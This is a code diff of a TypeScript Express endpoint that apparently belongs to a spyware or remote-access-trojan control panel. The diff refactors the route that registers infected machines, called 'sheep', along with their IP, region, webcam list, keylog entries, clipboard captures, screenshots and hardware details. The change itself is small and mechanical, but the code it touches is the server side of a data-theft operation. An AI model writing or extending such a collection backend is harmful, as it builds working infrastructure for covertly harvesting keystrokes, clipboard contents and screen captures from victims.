@@ -6,35 +6,32 @@ export default {
     method: "POST",
     description: "Sheep route",
     route: async (req: Request, res: Response) => {
-        const { name, ip, region, webcams, screenshots, keylog, clipboard, screenshot, devices, hardware, os }: {
-            name: string;
-            ip: string;
-            region: string;
-            webcams?: string[];
-            screenshots?: string[];
-            keylog?: { keylogDate: Date; data: string }[];
-            clipboard?: { clipboardDate: Date; data: string }[];
-            screenshot?: { screenshotDate: Date; file: Buffer }[];
-            devices?: string[];
-            hardware?: {
-                cpu: string;
-                ram: string;
-                storage: string;
-                gpu: string;
-            };
-            os?: {
-                name: string;
-                version: string;
-            };
-        } = req.body;
-
         try {
+            const { name, ip, region, webcams, screenshots, keylog, clipboard, screenshot, devices, hardware, os }: {
+                name: string;
+                ip: string;
+                region: string;
+                webcams?: string[];
+                screenshots?: string[];
+                keylog?: { keylogDate: Date; data: string }[];
+                clipboard?: { clipboardDate: Date; data: string }[];
+                screenshot?: { screenshotDate: Date; file: Buffer }[];
+                devices?: string[];
+                hardware?: {
+                    cpu: string;
+                    ram: string;
+                    storage: string;
+                    gpu: string;
+                };
+                os?: {
+                    name: string;
+                    version: string;
+                };
+            } = req.body;
+
             // Vérifiez si un Sheep avec le même nom ou la même adresse IP existe déjà
             const existingSheep = await Sheep.findOne({ $or: [{ name }, { ip }] });
-            if (existingSheep) {
-                res.status(400).json({ success: false, error: "Sheep with the same name or IP already exists" });
-                return;
-            }
+            if (existingSheep) return res.status(400).json({ success: false, error: "Sheep with the same name or IP already exists" });
 
             // Créez un nouveau Sheep
             const newSheep = new Sheep({
